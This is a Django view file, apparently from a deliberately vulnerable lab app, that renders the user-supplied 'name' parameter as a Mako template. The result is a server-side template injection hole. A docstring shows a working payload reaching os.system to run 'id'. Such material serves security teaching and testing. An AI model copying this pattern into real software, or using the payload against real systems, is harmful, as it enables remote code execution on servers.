# server_side_template_injection/views.py
from mako.template import Template
from mako.lookup import TemplateLookup
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

# Initialize the Mako template lookup
lookup = TemplateLookup(directories=['./'], input_encoding='utf-8', output_encoding='utf-8')
@csrf_exempt
def name_view(request):
    name = request.GET.get('name', '')

    # Vulnerable to SSTI: Mako template rendering with user input directly (without sanitization)
    # Template string that will be processed by Mako engine
    template_str = f"{name}"

    # Create Mako template from string and render it
    try:
        template = Template(template_str)
        rendered_name = template.render(name=name)
        """
        test raw example:
        Type "help", "copyright", "credits" or "license" for more information.
        >>> from mako.template import Template
        >>> print(Template("${self.module.cache.util.os}").render())
            <module 'os' (frozen)>
        >>> print(Template("${self.module.cache.util.os.system('id')}").render())
            uid=197608(user) gid=197121 groups=197121
            0
        >>>    
        """
        return JsonResponse({"name": rendered_name})
    
    except Exception as e:
        return JsonResponse({"error": str(e)}, status=400)
